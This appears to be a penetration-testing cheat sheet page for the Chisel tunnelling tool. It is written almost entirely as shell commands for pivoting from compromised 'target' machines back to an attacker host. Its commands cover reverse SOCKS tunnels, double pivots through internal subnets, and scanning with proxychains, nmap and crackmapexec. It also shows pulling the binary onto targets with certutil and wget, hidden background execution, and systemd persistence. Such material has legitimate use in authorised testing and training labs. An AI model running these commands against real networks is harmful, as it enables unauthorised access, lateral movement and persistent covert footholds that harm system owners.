---
icon: wolf-pack-battalion
---

# CHISEL

<figure><img src="../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

### Download & Installation

```bash
# Download latest release (Linux)
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz -O chisel.gz

# Download for Windows
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz -O chisel.gz

# Extract
gunzip chisel.gz

# Make executable
chmod +x chisel
```

### Resolve Port/Process Errors

```bash
# Check port usage
sudo lsof -i :8000

# Kill process on port
sudo kill -9 <PID>

# Kill all chisel processes
sudo pkill -9 chisel
```

### Server Setup (Attacker Machine)

```bash
# Start server (reverse mode - recommended)
./chisel server --reverse --port 8000

# Start with authentication
./chisel server --reverse --port 8000 --auth user:pass

# Start with SOCKS5 proxy
./chisel server --reverse --socks5 --port 8000

# Verbose mode
./chisel server --reverse --port 8000 -v
```

### Client Setup (Target Machine)

```bash
# Connect to server (reverse tunnel)
./chisel client 10.10.14.14:8000 R:socks

# Connect with authentication
./chisel client --auth user:pass 10.10.14.14:8000 R:socks

# Connect with fingerprint (more secure)
./chisel client --fingerprint <server-fingerprint> 10.10.14.14:8000 R:socks
```

### Port Forwarding Techniques

```bash
# Remote port forward (expose target port to attacker)
./chisel client 10.10.14.14:8000 R:8080:127.0.0.1:80

# Local port forward (expose attacker port to target)
./chisel client 10.10.14.14:8000 9090:127.0.0.1:3389

# Multiple port forwards
./chisel client 10.10.14.14:8000 R:8080:localhost:80 R:3390:localhost:3389

# Forward specific interface
./chisel client 10.10.14.14:8000 R:0.0.0.0:8080:127.0.0.1:80
```

### SOCKS Proxy Setup

```bash
# Start SOCKS5 proxy on server
./chisel server --reverse --socks5 --port 8000

# Client connects with SOCKS
./chisel client 10.10.14.14:8000 R:socks

# Specify SOCKS port (default 1080)
./chisel client 10.10.14.14:8000 R:1080:socks

# Use with proxychains
proxychains4 nmap -sT 172.16.5.10
```

### Configure Proxychains

```bash
# Edit proxychains config
sudo nano /etc/proxychains4.conf

# Add at bottom
socks5 127.0.0.1 1080

# Use with tools
proxychains4 curl http://172.16.5.10
proxychains4 crackmapexec smb 172.16.5.0/24
```

### Double Pivot Setup

```bash
# On attacker - start main server
./chisel server --reverse --port 8000

# On first target (Pivot1) - connect and expose port
./chisel client 10.10.14.14:8000 R:9000:127.0.0.1:9000 R:socks

# On first target - start secondary server
./chisel server --port 9000

# On second target (Pivot2) - connect to Pivot1
./chisel client <Pivot1-IP>:9000 R:9001:socks

# Add second SOCKS to proxychains
socks5 127.0.0.1 9001
```

### Reverse Pivot (Target to Attacker)

```bash
# Server on attacker (reverse mode)
./chisel server --reverse --port 8000

# Client on target forwards internal service
./chisel client 10.10.14.14:8000 R:8080:172.16.5.10:80

# Access from attacker
curl http://127.0.0.1:8080
```

### Forward Pivot (Attacker to Target)

```bash
# Server on target
./chisel server --port 8000

# Client on attacker
./chisel client <target-ip>:8000 8080:127.0.0.1:80

# Target can access attacker's port 80 via localhost:8080
```

### Host Chisel via Web Server

```bash
# Python HTTP server
python3 -m http.server 8080

# Updog (better alternative)
updog -p 8080

# Download on target (Windows)
certutil -urlcache -f http://10.10.14.14:8080/chisel.exe chisel.exe

# Download on target (Linux)
wget http://10.10.14.14:8080/chisel -O chisel && chmod +x chisel
```

### Remote Desktop Forwarding

```bash
# Forward RDP from target
./chisel client 10.10.14.14:8000 R:3389:127.0.0.1:3389

# Connect from attacker
xfreerdp /u:administrator /p:password /v:127.0.0.1:3389
```

### SSH Tunneling via Chisel

```bash
# Forward SSH port
./chisel client 10.10.14.14:8000 R:2222:172.16.5.10:22

# SSH from attacker
ssh user@127.0.0.1 -p 2222
```

### Multiple Network Pivoting

```bash
# First pivot - access subnet 172.16.5.0/24
./chisel client 10.10.14.14:8000 R:1080:socks

# From first target - access subnet 172.16.6.0/24
./chisel server --port 9000
./chisel client 10.10.14.14:8000 R:9000:127.0.0.1:9000

# Second target connects to first
./chisel client 172.16.5.10:9000 R:1081:socks

# Proxychains with multiple hops
socks5 127.0.0.1 1080  # First network
socks5 127.0.0.1 1081  # Second network
```

### Background Execution

```bash
# Linux - run in background
nohup ./chisel client 10.10.14.14:8000 R:socks &

# Windows - start hidden
Start-Process -NoNewWindow -FilePath ".\chisel.exe" -ArgumentList "client 10.10.14.14:8000 R:socks"

# Linux - screen/tmux
screen -dmS chisel ./chisel client 10.10.14.14:8000 R:socks
```

### Persistence Setup

```bash
# Linux - systemd service
sudo nano /etc/systemd/system/chisel.service

# Add:
[Unit]
Description=Chisel Client
[Service]
ExecStart=/usr/local/bin/chisel client 10.10.14.14:8000 R:socks
Restart=always
[Install]
WantedBy=multi-user.target

# Enable service
sudo systemctl enable chisel.service
sudo systemctl start chisel.service
```

### TLS/Encryption

```bash
# Server with TLS
./chisel server --reverse --port 8000 --tls-key server.key --tls-cert server.crt

# Client with TLS (auto-generated cert)
./chisel client https://10.10.14.14:8000 R:socks

# Verify fingerprint for security
./chisel client --fingerprint <fingerprint> 10.10.14.14:8000 R:socks
```

### Common Use Cases

```bash
# Web application access
./chisel client 10.10.14.14:8000 R:8080:localhost:80

# Database access
./chisel client 10.10.14.14:8000 R:3306:localhost:3306
mysql -h 127.0.0.1 -P 3306 -u root -p

# SMB shares
./chisel client 10.10.14.14:8000 R:445:172.16.5.10:445
smbclient //127.0.0.1/share -U user

# Winbox/RouterOS
./chisel client 10.10.14.14:8000 R:8291:192.168.1.1:8291
```

### Troubleshooting

```bash
# Check server is listening
netstat -tuln | grep 8000

# Verify connection
./chisel client --verbose 10.10.14.14:8000 R:socks

# Test SOCKS proxy
curl --proxy socks5://127.0.0.1:1080 http://172.16.5.10

# Kill hanging sessions
pkill -9 chisel

# Check firewall
sudo ufw allow 8000
```

### Cleanup & Exit

```bash
# Stop client (Ctrl+C)
^C

# Kill all chisel processes
killall chisel

# Remove from system
sudo rm /usr/local/bin/chisel

# Clean iptables rules (if any)
sudo iptables -F
```

### Performance Optimization

```bash
# Increase verbosity for debugging
./chisel server --reverse --port 8000 -v

# Set keepalive interval (30s)
./chisel client --keepalive 30s 10.10.14.14:8000 R:socks

# Set max retries
./chisel client --max-retry-count 10 10.10.14.14:8000 R:socks
```
